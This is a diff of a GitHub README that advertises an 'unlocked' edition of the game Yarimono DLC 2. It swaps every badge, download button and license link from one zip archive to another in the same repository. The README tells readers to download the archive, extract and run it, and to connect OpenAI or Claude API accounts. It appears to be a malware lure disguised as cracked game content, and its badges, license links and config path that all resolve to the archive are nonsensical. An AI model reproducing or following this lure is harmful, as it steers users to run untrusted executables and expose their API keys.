@@ -1,11 +1,11 @@
 # Yarimono DLC 2: Unlocked Experience Repository
 
-![Yarimono DLC 2](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip%20DLC%202-Unlocked%20Access-blueviolet)  
-![Maintenance](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip)  
-![API Supports](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip%20API-Integrated-blue)  
-![API Supports](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip%20API-Integrated-orange)  
-![License: MIT](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip)  
-![Stars](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip)  
+![Yarimono DLC 2](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip%20DLC%202-Unlocked%20Access-blueviolet)  
+![Maintenance](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip)  
+![API Supports](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip%20API-Integrated-blue)  
+![API Supports](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip%20API-Integrated-orange)  
+![License: MIT](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip)  
+![Stars](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip)  
 
 Discover a new realm of digital horizons with the exclusive **Yarimono DLC 2: Unlocked Experience**. This repository serves as your enchanted bridge to experiencing all that Yarimono DLC 2 has to offer, elegantly packaged with optimized performance, a spectrum of innovative features, and seamless integration for next-gen gamers and explorers alike. 
 
@@ -23,7 +23,7 @@ Unveiling the portal to Yarimono DLC 2 has never been more intuitive! Follow the
 2. **Embark on Yarimono DLC 2 — Unlocked Edition**  
    Click below to begin your adventure:
 
-   [![Download](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip%20Now-Yarimono%20DLC%202-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip)
+   [![Download](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip%20Now-Yarimono%20DLC%202-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip)
 
    - Click the badge above to summon the access gateway.
    - Extract the archive using a tool such as 7-Zip or WinRAR.
@@ -70,7 +70,7 @@ Looking to **download Yarimono DLC 2 Unlocked**? This repository is finely tuned
 The future is now. Yarimono DLC 2: Unlocked Experience repository offers ready-made support for artificial intelligence enhancement features:
 - **OpenAI API:** Generate AI-driven story elements, NPC dialogue, and dynamic hints in-game.
 - **Claude API:** Access advanced language processing for real-time translations and quest generation.
-- **Easy Setup:** API keys can be entered in the `https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip` file post-installation.
+- **Easy Setup:** API keys can be entered in the `https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip` file post-installation.
 - **Extendability:** Dream up your own tool integrations or community mods using the provided API hooks!
 
 _Transform your journey into a living, evolving odyssey powered by industry-leading AI suites._
@@ -94,9 +94,9 @@ Our digital guides await to assist you through every twist and turn—never get 
 
 Imagine returning from a fantastical journey and yearning to relive it all—here’s your second portal to entry:
 
-[![Download](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip%20Now-Yarimono%20DLC%202-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip%20Now-Yarimono%20DLC%202-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip)
 
-- After the download, run the `https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip` (or corresponding macOS/Linux file).
+- After the download, run the `https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip` (or corresponding macOS/Linux file).
 - Choose your preferred installation language and path.
 - When prompted, connect your OpenAI or Claude API account (optional for full feature experience).
 - Restart your system (if required) and launch via desktop icon.
@@ -113,7 +113,7 @@ This repository is intended solely for educational, archival, and non-commercial
 
 ## 📜 **License**
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip) © 2025, promoting open sharing and innovation. See the [LICENSE](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/unlocked_dlc_yarimono_content_v3.7-beta.3.zip) file for detailed permissions and obligations.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip) © 2025, promoting open sharing and innovation. See the [LICENSE](https://raw.githubusercontent.com/5haled23/yarimono-dlc2-content-unlocked/branch/movingly/yarimono-dlc-unlocked-content-v3.8.zip) file for detailed permissions and obligations.
 
 ---
 
